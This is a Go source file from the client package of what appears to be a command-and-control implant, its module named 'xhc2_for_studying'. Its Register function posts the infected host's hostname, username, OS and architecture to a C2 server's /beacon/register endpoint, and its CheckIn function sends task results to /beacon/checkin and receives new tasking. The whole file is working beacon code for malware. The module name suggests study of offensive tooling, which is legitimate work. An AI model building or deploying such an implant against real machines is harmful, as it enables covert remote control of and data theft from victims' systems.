package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	
	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/implant/identity"
	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
)

func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig) (string, error) {
	if c == nil {
		return "", errors.New("client is nil")
	}
	if hostInfo == nil {
		return "", errors.New("host info is nil")
	}
	if cfg == nil {
		return "", errors.New("beacon config is nil")
	}
	if c.baseURL == "" {
		return "", errors.New("client base url is empty")
	}
	
	req := &beaconProtocol.RegisterRequest{
		Hostname: hostInfo.Hostname,
		Username: hostInfo.Username,
		OS:       hostInfo.OS,
		Arch:     hostInfo.Arch,
		Interval: cfg.Interval,
		Jitter:   cfg.Jitter,
	}
	
	jsonReq, err := json.Marshal(req)
	if err != nil {
		return "", err
	}
	
	httpReq, err := http.NewRequest(
		http.MethodPost,
		c.baseURL+"/beacon/register",
		bytes.NewReader(jsonReq),
	)
	if err != nil {
		return "", err
	}
	httpReq.Header.Set("Content-Type", "application/json")
	
	if c.httpClient == nil {
		return "", errors.New("http client is nil")
	}
	
	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("register request failed with status %d", resp.StatusCode)
	}
	
	var registerResp beaconProtocol.RegisterResponse
	if err := json.NewDecoder(resp.Body).Decode(&registerResp); err != nil {
		return "", err
	}
	if registerResp.BeaconID == "" {
		return "", errors.New("empty beacon id in register response")
	}
	
	return registerResp.BeaconID, nil
}

func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*beaconProtocol.CheckinResponse, error) {
	if c == nil {
		return nil, errors.New("client is nil")
	}
	if beaconID == "" {
		return nil, errors.New("beacon id is empty")
	}
	if c.baseURL == "" {
		return nil, errors.New("client base url is empty")
	}
	
	reqTaskResult := protocol.TaskResult{}
	if taskResult != nil {
		reqTaskResult = *taskResult
	}
	
	req := &beaconProtocol.CheckinRequest{
		BeaconID:   beaconID,
		TaskResult: reqTaskResult,
	}
	jsonReq, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}
	httpReq, err := http.NewRequest(
		http.MethodPost,
		c.baseURL+"/beacon/checkin",
		bytes.NewReader(jsonReq),
	)
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if c.httpClient == nil {
		return nil, errors.New("http client is nil")
	}
	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("checkin request failed with status %d", resp.StatusCode)
	}
	var checkinResp beaconProtocol.CheckinResponse
	if err := json.NewDecoder(resp.Body).Decode(&checkinResp); err != nil {
		return nil, err
	}
	return &checkinResp, nil
}
